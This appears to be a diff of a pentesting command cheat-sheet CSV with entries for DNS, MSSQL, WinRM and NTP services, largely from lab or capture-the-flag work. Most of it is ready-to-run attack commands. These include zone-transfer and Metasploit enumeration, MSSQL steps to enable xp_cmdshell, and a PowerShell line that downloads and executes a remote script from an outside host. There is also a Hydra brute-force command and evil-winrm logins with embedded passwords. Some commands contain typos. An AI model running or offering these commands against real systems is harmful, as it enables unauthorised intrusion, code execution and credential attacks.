Diff between current HackTricks-Automatic-Commands/Main.csv and the newest csv
            old_csv = 95 lines
            new_csv = 105 lines
            total   = 10 new lines
            
            58a59,115
> DNS,53,Domain Name Service,Notes,Notes for DNS,"##These are the commands I run every time I see an open DNS port
> 
> dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}
> dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name}
> dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}
> dig axfr @{IP}
> dig axfr {Domain_Name} @{IP}
> nslookup
>     SERVER {IP}
>     127.0.0.1
>     {IP}
>     Domain_Name
>     exit
> 
> https://book.hacktricks.xyz/pentesting/pentesting-dns
> ",Verified,1
> DNS,53,Domain Name Service,Banner Grab,Grab DNS Banner,dig version.bind CHAOS TXT @DNS,Verified,2
> DNS,53,Domain Name Service,Nmap Vuln Scan,Scan for Vulnerabilities with Nmap,"nmap -n --script ""(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"" {IP}",Verified,3
> DNS,53,Domain Name Service,Zone Transfer,Three attempts at forcing a zone transfer,dig axfr @{IP} && dix axfr @{IP} {Domain_Name} && fierce -dns {Domain_Name},Verified,4
> DNS,53,Domain Name Service,Active Directory,Eunuerate a DC via DNS,"dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args ""dns-srv-enum.domain={Domain_Name}""",Verified,5
> DNS,53,Domain Name Service,consolesless mfs enumeration,DNS enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/dns/dns_amp; set RHOSTS {IP}; set RPORT 53; run; exit' && msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS {IP}; set RPORT 53; run; exit',Verified,6
> MSSQL,1433,Microsoft SQL Server,Notes,Notes for MSSQL,"#Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
> 
> #sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
> 
> ###the goal is to get xp_cmdshell working###
> 1. try and see if it works
>     xp_cmdshell `whoami`
>     go
> 
> 2. try to turn component back on
>     EXEC SP_CONFIGURE 'xp_cmdshell' , 1
>     reconfigure
>     go
>     xp_cmdshell `whoami`
>     go
> 
> 3. 'advanced' turn it back on
>     EXEC SP_CONFIGURE 'show advanced options', 1
>     reconfigure
>     go
>     EXEC SP_CONFIGURE 'xp_cmdshell' , 1
>     reconfigure
>     go
>     xp_cmdshell 'whoami'
>     go
> 
> 
> 
> 
> xp_cmdshell ""powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')""
> 
> 
> https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
> ",Verified,1
> MSSQL,1433,Microsoft SQL Server,Nmap for SQL,Nmap with SQL Scripts,"nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}",Verified,2
> MSSQL,1433,Microsoft SQL Server,MSSQL consolesless mfs enumeration,MSSQL enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit',Verified,3
92,106c149
< MSSQL,1433,Microsoft SQL Server,Notes,Notes for MSSQL,"#Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
< 
< #sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
< 
< ###the goal is to get xp_cmdshell working###
< 1. try and see if it works
<     xp_cmdshell `whoami`
<     go
< 
< 2. try to turn component back on
<     EXEC SP_CONFIGURE 'xp_cmdshell' , 1
<     reconfigure
<     go
<     xp_cmdshell `whoami`
<     go
---
> WinRM,5985,Windows Remote Managment,Notes,Notes for WinRM,"#Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.
108,116c151,154
< 3. 'advanced' turn it back on
<     EXEC SP_CONFIGURE 'show advanced options', 1
<     reconfigure
<     go
<     EXEC SP_CONFIGURE 'xp_cmdshell' , 1
<     reconfigure
<     go
<     xp_cmdshell 'whoami'
<     go
---
> sudo gem install winrm winrm-fs colorize stringio 
> git clone https://github.com/Hackplayers/evil-winrm.git 
> cd evil-winrm
> ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’
117a156
> https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/
118a158,161
> ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
> ^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
> menu
> invoke-binary `tab`
119a163,167
> #python3
> import winrm
> s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
> print(s.run_cmd('ipconfig'))
> print(s.run_ps('ipconfig'))
121,124c169
< xp_cmdshell ""powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')""
< 
< 
< https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
---
> https://book.hacktricks.xyz/pentesting/pentesting-winrm
126,127c171
< MSSQL,1433,Microsoft SQL Server,Nmap for SQL,Nmap with SQL Scripts,"nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}",Verified,2
< MSSQL,1433,Microsoft SQL Server,MSSQL consolesless mfs enumeration,MSSQL enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit',Verified,3
---
> WinRM,5985,Windows Remote Managment,Hydra Brute Force,Need User,hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP},Verified,2
230a275,279
> NTP,123,Network Time Protocol,Notes,Notes for NTP,"#The Network Time Protocol (NTP) is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks.
> 
> https://book.hacktricks.xyz/pentesting/pentesting-ntp
> ",Verified,1
> NTP,123,Network Time Protocol,Nmap,Enumerate NTP,"nmap -sU -sV --script ""ntp* and (discovery or vuln) and not (dos or brute)"" -p 123 {IP}",Verified,2